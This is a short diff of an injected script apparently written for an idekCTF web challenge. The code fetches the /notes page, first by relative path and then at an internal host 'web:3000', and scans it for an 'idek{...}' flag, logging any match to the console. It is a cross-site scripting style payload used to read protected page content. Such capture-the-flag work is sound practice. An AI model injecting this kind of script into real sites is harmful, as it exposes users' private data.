@@ -1,12 +1,9 @@
 <script>
-(async () => {
-  const res = await fetch("/notes");
-  const html = await res.text();
-  const match = html.match(/idek\{.*?\}/);
-  if (match) {
-    console.log("🔥 FLAG:", match[0]);
-  } else {
-    console.log("❌ No flag found");
-  }
-})();
+fetch("http://web:3000/notes")
+  .then(r => r.text())
+  .then(t => {
+    const f = t.match(/idek\{.*?\}/);
+    if (f) console.log("🔥 FLAG:", f[0]);
+    else console.log("❌ Flag not found");
+  });
 </script>
